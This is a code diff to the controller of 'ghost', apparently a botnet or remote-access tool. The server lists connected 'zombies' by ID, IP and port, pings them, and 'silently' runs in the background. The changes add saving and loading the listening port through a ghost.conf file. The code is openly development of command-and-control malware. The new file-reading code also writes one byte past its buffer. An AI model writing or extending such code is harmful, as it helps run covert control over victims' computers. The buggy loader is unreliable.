@@ -20,8 +20,6 @@
 	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#include				"stdafx.h"
-
 #define					DEFAULT_BUFF	9056
 #define					AHXRLOGGER_PLUGIN // https://github.com/AHXR/ahxrlogger
 
@@ -40,6 +38,8 @@
 											}
 #define					SHOW_GHOST()		{ system("CLS"); LOG("%s\n\n", c_ascii); }
 #define					GO_BACK()			{ LOG("[COLOR:GREEN]0) [Back to Main Menu]"); }
+
+#define					GHOST_CONFIG		"ghost.conf"
 
 #include				"ahxrwinsock.h"
 #include				"ghostlib.h"
@@ -95,10 +95,18 @@ void refreshClients() {
 			continue;
 		}
 
+		/*char buf;
+		int err = recv(client_data.socketRef, &buf, 1, MSG_PEEK | MSG_DONTWAIT);
+		if (err == SOCKET_ERROR)
+			if (WSAGetLastError() != WSAEWOULDBLOCK)
+				ghostlib::deleteZombie(i);
+		*/
+		
 		i_res = send(client_data.socketRef, "ghost_ping", 10, 0 ); // Testing if socket is active. Will never respond.
 
 		if (i_res == SOCKET_ERROR)
 			ghostlib::deleteZombie(i);
+		
 	}
 }
 
@@ -139,11 +147,33 @@ DWORD WINAPI t_gui(LPVOID params) {
 
 	// Showing the menu and starting the ghost server.
 	SHOW_GHOST();
-	LOG("[COLOR:RED]This process will silently run in the background as \"ghost.exe\". Make sure this port is equal to the port you have sent to the client. Otherwise, data will be sent via email.");
-	printf("\nPlease enter your listening port: ");
 
-	cin >> s_option;
-	c_port = s_option;
+	fstream f_config_file(GHOST_CONFIG, ios::in);
+
+	if (!f_config_file.is_open()) {
+		LOG("[COLOR:RED]This process will silently run in the background as \"ghost.exe\". Make sure this port is equal to the port you have sent to the client. Otherwise, data will be sent via email.");
+		printf("\nPlease enter your listening port: ");
+
+		cin >> s_option;
+		c_port = s_option;
+	}
+	else {
+		f_config_file.seekg(0, f_config_file.end);
+		int i_length = (int)f_config_file.tellg();
+		f_config_file.seekg(0, f_config_file.beg);
+
+		char * c_buffer = new char[i_length];
+
+		f_config_file.read(c_buffer, i_length);
+
+		c_buffer[i_length] = '\0';
+		if (c_buffer[i_length - 1] == '\n')
+			c_buffer[i_length - 1] = '\0';
+
+		s_option = c_buffer;
+		c_port = s_option;
+		f_config_file.close();
+	}
 
 	if (!a_server.start_server(s_option.c_str(), TCP_SERVER, onServerClientConnect, onServerRecData)) {
 		ERROR("Could not run server... Try again.");
@@ -172,7 +202,7 @@ DWORD WINAPI t_gui(LPVOID params) {
 
 					GO_BACK();
 					for (int i = 0; i < ghostlib::getZombieCount(); i++) {
-						client_data		= ghostlib::getZombieData(i);
+						client_data		= ghostlib::getZombieData(i); // Returning a reference to the struct
 
 						j_data			= json::parse(client_data.system_data);
 						s_output		= j_data["ID"].get<std::string>() + std::string(" - ") + j_data["IP"].get<std::string>() + std::string(":" + j_data["PORT"].get<std::string>());
@@ -337,6 +367,21 @@ DWORD WINAPI t_gui(LPVOID params) {
 			case 2: { // Configuration
 				SHOW_GHOST();
 				SHOW_CONFIG();
+
+				char s_save = ' ';
+				cin.ignore();
+				while (s_save != 'y' && s_save != 'n') {
+					LOG("Would you like to save this config to a file so you can instantly run this server in the future? (y/n)");
+					cin >> s_save;
+				}
+
+				if (s_save == 'y') {
+					fstream f_save(GHOST_CONFIG, ios::out);
+					f_save << c_port;
+					f_save.close();
+
+					LOG("[COLOR:BROWN]Configuration file saved as %s", GHOST_CONFIG);
+				}
 				break;
 			}
 			case 3: { // Refresh
@@ -364,7 +409,7 @@ void onServerClientConnect(SOCKET clientSocket, CLIENTDATA info) {
 }
 
 void onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data) {
-	string s_data	= data;
+	string s_data = data;
 
 	if (b_waiting) {
 		LOG("[RESPONSE]\n%s", data);
